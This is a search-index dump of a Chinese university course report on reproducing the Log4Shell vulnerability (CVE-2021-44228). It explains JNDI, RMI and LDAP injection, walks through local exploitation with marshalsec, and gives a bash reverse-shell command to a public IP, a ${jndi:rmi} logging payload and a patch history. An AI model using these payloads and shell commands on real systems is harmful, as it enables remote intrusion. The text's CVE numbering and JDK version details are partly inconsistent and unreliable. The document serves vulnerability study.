\u670d\u52a1\u7aef\u8f93\u51fa\u4e86\u4e00\u6761\u53d1\u9001 LDAP \u5f15\u7528\u7684\u8bed\u53e5\uff0c\u8bf4\u660e log4j \u5e94\u7528\u786e\u5b9e\u8fde\u63a5\u4e86 LDAP \u670d\u52a1\u7aef\u5e76\u83b7\u53d6\u4e86 Exploit.class \u7c7b\u6587\u4ef6\u3002\u800c\u4e14\u56e0\u4e3a\u5176\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u770b\u5230\u5f39\u51fa\u4e86\u8ba1\u7b97\u5668\uff0c\u8bf4\u660e\u4e86\u8fd9\u4e2a\u9759\u6001\u4ee3\u7801\u786e\u5b9e\u88ab\u6267\u884c\u4e86\u3002\u8fd9\u4e5f\u5c31\u590d\u73b0\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u63a5\u4e0b\u6765\u66f4\u6362\u4e00\u4e0b exec \u6267\u884c\u7684\u547d\u4ee4\uff0c\u6765\u5b9e\u73b0\u53cd\u5f39\u7ec8\u7aef\u3002 \u9996\u5148\u5728\u8fdc\u7a0b\u516c\u7f51\u670d\u52a1\u5668\uff08ip \u662f 47.103.43.32\uff09\u901a\u8fc7 nc -lnvvp 7777 \u5728 7777 \u7aef\u53e3\u76d1\u542c\uff0c\u7528\u6765\u6355\u83b7\u53cd\u5f39\u7684\u7ec8\u7aef\u3002\u7136\u540e\u66f4\u6539\u653b\u51fb\u7c7b\u4ee3\u7801\uff1a String [] cmds = { \"/bin/bash\" , \"-c\" , \"bash -i >& /dev/tcp/47.103.43.32/7777 0>&1\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); \u5373\u901a\u8fc7 /dev/tcp \u8bbe\u5907\u5c06 bash \u7684\u8f93\u5165\u8f93\u51fa\u6d41\u91cd\u5b9a\u5411\u5230\u516c\u7f51\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0 get shell\u3002\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\uff1a \u7531\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u8fde\u63a5\u4e0a\u4e86\u5f53\u524d\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u7684 macOS \u4e3b\u673a\u3002 \u8c03\u7528\u6808\u5206\u6790 \u00b6 \u901a\u8fc7\u8c03\u8bd5\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u53ef\u4ee5\u83b7\u53d6\u5230\u6574\u4e2a\u7a0b\u5e8f\u7684\u8c03\u7528\u6808\uff1a < clinit > : 11 , Exploit forName0 : - 1 , Class ( java . lang ) forName : 348 , Class ( java . lang ) loadClass : 91 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 101 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 115 , VersionHelper12 ( com . sun . naming . internal ) getObjectFactoryFromReference : 163 , NamingManager ( javax . naming . spi ) getObjectInstance : 189 , DirectoryManager ( javax . naming . spi ) c_lookup : 1114 , LdapCtx ( com . sun . jndi . ldap ) p_lookup : 542 , ComponentContext ( com . sun . jndi . toolkit . ctx ) lookup : 177 , PartialCompositeContext ( com . sun . jndi . toolkit . ctx ) lookup : 205 , GenericURLContext ( com . sun . jndi . toolkit . url ) lookup : 94 , ldapURLContext ( com . sun . jndi . url . ldap ) lookup : 417 , InitialContext ( javax . naming ) lookup : 172 , JndiManager ( org . apache . logging . log4j . core . net ) lookup : 56 , JndiLookup ( org . apache . logging . log4j . core . lookup ) lookup : 221 , Interpolator ( org . apache . logging . log4j . core . lookup ) resolveVariable : 1110 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 1033 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 912 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) replace : 467 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) format : 132 , MessagePatternConverter ( org . apache . logging . log4j . core . pattern ) format : 38 , PatternFormatter ( org . apache . logging . log4j . core . pattern ) toSerializable : 344 , PatternLayout$PatternSerializer ( org . apache . logging . log4j . core . layout ) toText : 244 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 229 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 59 , PatternLayout ( org . apache . logging . log4j . core . layout ) directEncodeEvent : 197 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryAppend : 190 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) append : 181 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryCallAppender : 156 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender0 : 129 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenderPreventRecursion : 120 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender : 84 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenders : 540 , LoggerConfig ( org . apache . logging . log4j . core . config ) processLogEvent : 498 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 481 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 456 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 63 , DefaultReliabilityStrategy ( org . apache . logging . log4j . core . config ) log : 161 , Logger ( org . apache . logging . log4j . core ) tryLogMessage : 2205 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageTrackRecursion : 2159 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageSafely : 2142 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessage : 2017 , AbstractLogger ( org . apache . logging . log4j . spi ) logIfEnabled : 1983 , AbstractLogger ( org . apache . logging . log4j . spi ) error : 740 , AbstractLogger ( org . apache . logging . log4j . spi ) main : 11 , log4j \u53ef\u4ee5\u8f83\u6e05\u6670\u5730\u5206\u6790\u51fa\u6765\u7a0b\u5e8f\u8fdb\u5165\u6267\u884c logger.error\uff0c\u7136\u540e\u5728 log \u4e2d\u9010\u5c42\u8c03\u7528\u6700\u7ec8\u8c03\u7528\u5230 resolveVariable \u5373\u5904\u7406 ${} \u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u5230\u4e86 Interpolator \u7684 lookup \u65b9\u6cd5\uff0c\u5176\u4e2d\u5bfb\u627e\u5230\u4e86 JndiLookup \u7c7b\uff0c\u8c03\u7528\u5176 lookup \u65b9\u6cd5\uff0c\u4ece LDAP \u670d\u52a1\u83b7\u53d6\u7c7b\uff0c\u7136\u540e\u4ece\u4e2d getObjectInstance\uff0c\u8fd9\u91cc\u4f1a\u8fdb\u884c loadClass \u64cd\u4f5c\uff0c\u800c\u5176\u4e2d\u8c03\u7528\u4e86 Exploit \u7c7b\u9690\u85cf\u7684 clinit \u65b9\u6cd5\u4e5f\u5c31\u662f\u9759\u6001\u4ee3\u7801\uff0c\u9020\u6210 RCE\u3002 RMI \u5b9e\u73b0 \u00b6 RMI \u7684\u5b9e\u73b0\u7c7b\u4f3c LDAP\uff0cExploit \u7c7b\u540c\u6837\u4f7f\u7528\u8c03\u7528\u8ba1\u7b97\u5668\u7684\u4ee3\u7801\uff0c\u901a\u8fc7 python \u5f00\u542f HTTP \u670d\u52a1\u63d0\u4f9b\u7ed9 RMI\u3002\u7136\u540e\u540c\u6837\u901a\u8fc7 marshalsec \u6765\u642d\u5efa RMI \u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3\u5728 1099\uff09\uff1a java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.RMIRefServer \"http://127.0.0.1:8888/#Exploit\" \u7565\u4fee\u6539\u4e00\u4e0b log4j \u6f0f\u6d1e\u5e94\u7528\uff0c\u4f7f\u4e4b\u8bb0\u5f55 ${jndi:rmi://127.0.0.1:1099/Exploit}\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.rmi.object.trustURLCodebase\" , \"true\" ); System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:rmi://127.0.0.1:1099/Exploit}\" ); } } \u8fd0\u884c\u53d1\u73b0\u8ba1\u7b97\u5668\u5df2\u88ab\u8c03\u51fa\uff1a log4j \u6f0f\u6d1e\u4fee\u590d \u00b6 \u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002 \u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002 \u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002 \u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002 Reference \u00b6 CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228 NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228 Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html \u3010\u6f0f\u6d1e\u901a\u544a\u3011Apache Log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-44228/CVE-2021-45046\uff09. https://help.aliyun.com/noticelist/articleid/1060971232.html Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/ tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec log4j \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u53ca\u4fee\u590d\u65b9\u6848. https://zhuanlan.zhihu.com/p/444140910 JNDI \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ca\u89e3\u51b3\u65b9\u6848. https://zhuanlan.zhihu.com/p/447220806 Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm Java \u4e2d RMI \u7684\u4f7f\u7528. https://cloud.tencent.com/developer/article/1824106 Pickle, \u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u539f\u7406\u4e0e\u793a\u4f8b. https://www.cnblogs.com/wxisme/p/5296441.html Authing \u8eab\u4efd\u4e91, LDAP \u534f\u8bae\u5165\u95e8\uff08\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09. https://zhuanlan.zhihu.com/p/147768058 JNDI \u6ce8\u5165\u539f\u7406\u53ca\u5229\u7528. https://xz.aliyun.com/t/6633#toc-7 hldfight, log4j \u5b98\u65b9\u6f0f\u6d1e\u4fee\u590d\u53f2. https://blog.csdn.net/qsort_/article/details/122101423 rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608 LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623 \u4ece\u96f6\u5230\u4e00\u5e26\u4f60\u6df1\u5165 log4j2 Jndi RCE CVE-2021-44228 \u6f0f\u6d1e - 2.15.0 rc1\u7ed5\u8fc7\u8be6\u89e3. https://paper.seebug.org/1789/#0x06-2150-rc1 4ra1n, \u6d45\u8c08 Log4j2 \u4e4b 2.15.0 \u7248\u672c RCE. https://xz.aliyun.com/t/10689","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#log4j","text":"Abstract \u8fd9\u7bc7\u662f\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u7684\u8bfe\u7a0b\u62a5\u544a \u4ecb\u7ecd\u4e86 log4j \u53ca\u7531\u5176\u5f15\u53d1\u7684 CVE-2021-44228 \u6f0f\u6d1e\uff0c\u5e76\u4ece JNDI\u3001LDAP\u3001RMI\u3001log4j \u7b49\u65b9\u9762\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u5177\u4f53\u539f\u7406\uff0c\u518d\u901a\u8fc7 LDAP\u3001RMI \u4e24\u79cd\u65b9\u5f0f\u672c\u5730\u590d\u73b0\u8be5\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u548c\u53cd\u5f39\u7ec8\u7aef\uff0c\u6700\u540e\u4ecb\u7ecd\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u3002","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#log4j_1","text":"","title":"log4j \u6f0f\u6d1e\u6982\u8ff0"},{"location":"cs/web/log4j_vuln/#log4j_2","text":"log4j \u662f Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u6e90 Java \u65e5\u5fd7\u6846\u67b6\u3002\u5b83\u63d0\u4f9b\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0e\u8f93\u51fa\u529f\u80fd\uff0c\u53ef\u4ee5\u8f93\u51fa\u65e5\u5fd7\u5230\u4efb\u610f\u4f4d\u7f6e\u3001\u66f4\u6539\u65e5\u5fd7\u5185\u5bb9\u6837\u5f0f\u3001\u6307\u5b9a\u65e5\u5fd7\u7ea7\u522b\u5e76\u5206\u7ea7\u522b\u663e\u793a\u3001\u4ee5\u53ca\u5229\u7528 ${} \u8bed\u53e5\u8f93\u51fa\u52a8\u6001\u5185\u5bb9\u7b49\u3002 \u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c1.x \u7248\u672c\u7684 log4j \u9010\u6e10\u5728\u7ed3\u6784\u3001\u6027\u80fd\u4e0a\u88ab slf4j\u3001logback \u7b49\u65b0\u5174\u7684\u65e5\u5fd7\u6846\u67b6\u8d85\u8d8a\uff0cApache \u4e5f\u56e0\u6b64\u5bf9 log4j \u8fdb\u884c\u4e86\u4e00\u6b21\u91cd\u6784\u5347\u7ea7\uff0c\u53d1\u5e03\u4e86\u4f18\u5316\u4e86\u7ed3\u6784\u3001\u6027\u80fd\u7684 2.x \u7248\u672c log4j\uff08\u53c8\u540d log4j2\uff09\u3002log4j2 \u501f\u9274\u4e86 slf4j \u7684\u7ed3\u6784\u8bbe\u8ba1\uff0c\u5206\u4e3a\u4e86\u4e24\u90e8\u5206\uff1alog4j-api\u3001log4j-core\uff0c\u524d\u8005\u4ec5\u63d0\u4f9b\u63a5\u53e3\uff0c\u540e\u8005\u63d0\u4f9b\u5b9e\u73b0\u3002\u5305\u540d\u5206\u522b\u4e3a org.apache.logging.log4j \u548c org.apache.logging.log4j.core\u3002 \u56e0\u4e3a log4j \u7684\u6613\u7528\u6027\uff0c\u4f17\u591a\u4ee5 Java \u4f5c\u4e3a\u540e\u7aef\u670d\u52a1\u8bed\u8a00\u7684\u7f51\u7edc\u5e94\u7528\u3001\u8f6f\u4ef6\u90fd\u5728\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u3002","title":"log4j \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#cve-2021-44228","text":"CVE-2021-44228 \u662f\u963f\u91cc\u4e91\u56e2\u961f\u5728 2021 \u5e74 11 \u6708 26 \u65e5\u63d0\u4ea4\u3001\u540c\u5e74 12 \u6708 9 \u65e5\u516c\u5f00\u7684\u5173\u4e8e log4j \u7684\u91cd\u5927\u6f0f\u6d1e\u3002\u5b83\u53ef\u4ee5\u5b9e\u73b0 RCE\uff08Remote Code Execution\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff09\uff0c\u4ece\u800c\u5371\u5bb3\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684 Java \u670d\u52a1\u5668\u7684\u5b89\u5168\u3002CVSS3.0\uff08\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\uff09\u8bc4\u5206 10.0 \u5206\u3001\u8bc4\u7ea7 critical\u3002 \u8be5\u6f0f\u6d1e\u5a01\u80c1\u7b49\u7ea7\u9ad8\u3001\u5f71\u54cd\u9762\u5e7f\u6cdb\u3001\u5229\u7528\u4ef7\u503c\u9ad8\u3001\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u53d7\u5230\u5e7f\u6cdb\u5173\u6ce8\u3002\u5e76\u4e14\u56e0\u4e3a log4j \u7684\u5e7f\u6cdb\u5e94\u7528\uff0c\u5305\u62ec\u82f9\u679c\u3001\u8c37\u6b4c\u3001\u767e\u5ea6\u3001Steam \u7b49\u5728\u5185\u7684\u5927\u578b\u4e92\u8054\u7f51\u4f01\u4e1a\u7684\u4ea7\u54c1\u4e5f\u90fd\u53d7\u5230\u8be5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002 \u8be5\u6f0f\u6d1e\u7531 JNDI \u7279\u6027\u5f15\u8d77\uff0c\u5176\u5e76\u6ca1\u6709\u4fdd\u62a4\u901a\u8fc7 LDAP \u7b49\u67e5\u627e JNDI \u7684\u65b9\u5f0f\uff0c\u9020\u6210\u6f5c\u5728\u7684 RCE\u3002\u5f71\u54cd\u8303\u56f4\u4ece log4j \u7248\u672c 2.0-beta9 \u5f00\u59cb\u5230 2.15.0-rc1\uff0c\u5e76\u5728 2.15.0-rc2 \u7248\u672c\u4e2d\u5c06\u8fd9\u4e00\u884c\u4e3a\u9ed8\u8ba4\u5173\u95ed\uff0c\u5728 2.16.0 \u7248\u672c\u4e2d\u5b8c\u5168\u79fb\u9664\u3002","title":"CVE-2021-44228"},{"location":"cs/web/log4j_vuln/#log4j_3","text":"","title":"log4j \u6f0f\u6d1e\u539f\u7406"},{"location":"cs/web/log4j_vuln/#jndi","text":"JNDI\uff08Java Naming and Directory Interface\uff0cJava \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\u662f\u7528\u4e8e\u4ece Java \u5e94\u7528\u4e2d\u8bbf\u95ee\u540d\u79f0\u548c\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u7ec4 API\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5c06\u540d\u79f0/\u76ee\u5f55\u4e0e\u5bf9\u8c61\u76f8\u5173\u8054\uff0c\u5e76\u63d0\u4f9b\u4e86\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u6765\u67e5\u627e\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 JNDI \u67b6\u6784\u5206\u4e3a\u4e09\u5c42\uff1a JNDI API\uff1a\u4e0e Java \u5e94\u7528\u7a0b\u5e8f\u901a\u4fe1\uff0c\u63d0\u4f9b\u7f16\u7a0b\u63a5\u53e3\uff0c\u9694\u79bb\u5e94\u7528\u4e0e\u6570\u636e\u6e90 Naming Manager\uff1a\u547d\u540d\u670d\u52a1\u7ba1\u7406\u5668 JNDI SPI\uff1a\u4e0e\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\uff08\u670d\u52a1\uff09\u76f8\u8fde\u63a5 JNDI \u652f\u6301\u7684\u670d\u52a1\u6709\u5f88\u591a\uff0c\u6bd4\u5982 RMI\u3001LDAP\u3001DNS \u7b49\u670d\u52a1\u3002JNDI \u5c01\u88c5\u4e86\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f7f\u5f97\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u4ee3\u7801\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\uff08\u8c03\u7528\u5bb9\u5668\u73af\u5883\u7684 Context \u7684 lookup \u65b9\u6cd5\uff09","title":"JNDI \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#rmi","text":"RMI\uff08Remote Method Invocation\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\u670d\u52a1\u63d0\u4f9b\u4e86\u4ece\u4e00\u4e2a JVM \u4e2d\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2a JVM \u5bf9\u8c61\u65b9\u6cd5\u7684\u65b9\u5f0f\u3002\u4e5f\u662f RPC\uff08Remote Procedure Calls\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u9762\u5411\u5bf9\u8c61\u7b49\u4ef7\u670d\u52a1\u3002\u5b83\u9700\u8981\u4e00\u4e2a Server \u7aef\u63d0\u4f9b RMI \u670d\u52a1\u548c\u4e00\u4e2a Client \u7aef\u8bbf\u95ee\u8fdc\u7a0b\u63d0\u4f9b\u7684 RMI \u670d\u52a1\u3002RMI \u670d\u52a1\u5206\u4e3a\u4e09\u5c42\uff1a \u5b58\u6839\u4e0e\u9aa8\u67b6 \u5b58\u6839\uff08Stub\uff09\uff1a\u4e0e Client \u7aef\u76f8\u8fde\uff0c\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u4ee3\u7406 \u9aa8\u67b6\uff08Skeleton\uff09\uff1a\u4e0e Server \u7aef\u76f8\u8fde\uff0c\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5 \u8fdc\u7a0b\u5f15\u7528\u5c42\uff08Remote Reference Layer\uff09\uff1a\u7528\u6765\u5bfb\u627e\u901a\u4fe1\u5bf9\u8c61\u4ee5\u53ca\u901a\u8fc7 RMI Registry \u63d0\u4f9b\u547d\u540d\u670d\u52a1 \u4f20\u8f93\u5c42\uff08Transport Layer\uff09\uff1a\u5728 Server \u4e0e Client \u7aef\u5efa\u7acb socket \u901a\u4fe1 Server \u7aef\u5f00\u542f RMI \u670d\u52a1\u65f6\u5148\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5411 registry \u6ce8\u518c\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7b49\u5f85\u8c03\u7528\u3002Client \u7aef\u8fdb\u884c RMI \u65f6\u8bbf\u95ee registry \u5f97\u5230\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\uff0c\u518d\u901a\u8fc7\u5b58\u6839\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u5b58\u6839\u5e8f\u5217\u5316\u8c03\u7528\u540e\u4e0e\u9aa8\u67b6\u901a\u4fe1\u4f7f\u9aa8\u67b6\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5b58\u6839\u518d\u53cd\u5e8f\u5217\u5316\u4ea4\u7ed9\u5ba2\u6237\u7aef\u3002","title":"RMI \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#ldap","text":"LDAP\uff08Lightweight Directory Access Protocol\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7 TCP/IP \u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 LDAP \u534f\u8bae\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u6811\u5f62\u7684\u6570\u636e\u5e93\u3002","title":"LDAP \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#jndi_1","text":"\u5982\u524d\u9762\u6240\u8bf4\uff0cJNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002 JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit \u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002 \u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09","title":"JNDI 